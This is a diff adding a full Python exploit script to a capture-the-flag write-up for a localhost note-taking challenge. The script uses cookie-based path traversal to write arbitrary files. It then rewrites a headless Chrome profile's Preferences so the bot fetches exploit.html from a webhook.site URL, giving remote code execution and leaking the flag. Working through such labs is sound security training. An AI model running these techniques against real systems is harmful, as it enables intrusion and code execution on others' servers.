@@ -615,3 +615,111 @@ Looping the ports and adding binary and ARGS to exfiltarte the flag.
 7. Run the script 1 again but with changes that change download directory to /tmp and remove [webhook.site](http://webhook.site) link so that it doesn't ping webhook.site everytime bot visits localhost
 8. Now trigger bot with [http://localhost:1337/static/exploit.html](http://localhost:1337/static/exploit.html) and it will be opened as webpage and boom💥 RCE !! 
 9. Now this will add /static/flag.txt just visit [http://localhost:1337/static/flag.txt](http://localhost:1337/static/flag.txt) and u will see the flag ⛳
+
+
+## **`Full attack script`**
+
+u will have to host the script 2 on webhook and write your webhook site in place of dummy [webhook.site](http://webhook.site) url and u will get the flag on the terminal
+
+```python
+import requests
+import os
+import json
+import re
+import time
+
+HOST = "http://localhost:1337/"
+
+session = requests.Session()
+
+def register(username, password):
+    response = session.post(HOST + "/api/register", json={
+        "username": username,
+        "password": password,
+    })
+
+def login(username, password):
+    response = session.post(HOST+"/api/login", json={
+        "username": username,
+        "password": password,
+    })
+
+def upload(filename, content):
+    response = session.post(HOST+"/api/notes/upload", files={
+        "file": (filename, content)
+    })
+
+def sanitize_filename(filename):
+    return re.sub(r'[^A-Za-z0-9_/]', '', filename)
+
+def reporting_the_url(url):
+    resp = session.post(HOST+"/api/visit", json={
+        'url': url
+    })
+
+def getting_instance_id():
+    register("hello1", "hello")
+    login("hello1", "hello")
+    instance_id = session.cookies.get('INSTANCE')
+    print("[+] got the instance id", instance_id)
+    return instance_id
+
+def arbitrary_file_write(path, content):
+    s = requests.Session()  # Use separate session to avoid cookie pollution
+    directory, filename = os.path.dirname(path), os.path.basename(path)
+
+    s.cookies.set("INSTANCE", f"/../../../../..{directory}")  # Set malicious path
+    s.post(HOST + "/api/register", json={"username": "..", "password": "pw"})  # Server sets clean cookie, overwriting yours
+    s.post(HOST + "/api/login", json={"username": "..", "password": "pw"})
+    s.cookies.set("INSTANCE", f"/../../../../..{directory}")  # ✅ Re-set it again after login
+    s.post(HOST + "/api/notes/upload", files={"file": (filename, content)})
+    print("[+] Arbitrary file write done to", path)
+
+def reading_flag():
+    response = session.get(HOST+"static/flag.txt")
+    print("[FLAG] -> ", response.text)
+
+preferences1 = {
+    "download": {
+        "default_directory": "/app/static"
+    },
+    "session": {
+        "restore_on_startup": 4,
+        "startup_urls": ["https://webhook.site/5b39a592-9fb2-445c-a676-dc0e44535977/exploit.html"]
+    }
+}
+
+content1 = json.dumps(preferences1).encode()
+
+preferences2 = {
+    "download": {
+        "default_directory": "/tmp"
+    },
+    "session": {
+        "restore_on_startup": 4,
+        "startup_urls": [{}]
+    }
+}
+
+content2 = json.dumps(preferences2).encode()
+
+if __name__ == "__main__":
+    print("[*] register a user")
+    instance_id = getting_instance_id()
+    reporting_the_url(HOST)
+    print("[*] reporting url for making chrome_profile files")
+    time.sleep(5)
+    arbitrary_file_write(f"/app/instances/{instance_id}/chrome_profile/Default/Preferences",
+                       content1)
+    print("[*] changed the preference file for download directory as /app/static and webhook as startup url")
+    reporting_the_url(HOST)
+    print("[*] report url for pinging webhook fetching exploit.html")
+    time.sleep(3)
+    arbitrary_file_write(f"/app/instances/{instance_id}/chrome_profile/Default/Preferences",
+                       content2)
+    print("[*] changed the preference file for download directory as /tmp and {} as startup url")
+    reporting_the_url(HOST+"static/exploit.html")
+    print("[*] bot visiting the payload")
+    time.sleep(8)
+    reading_flag()
+```
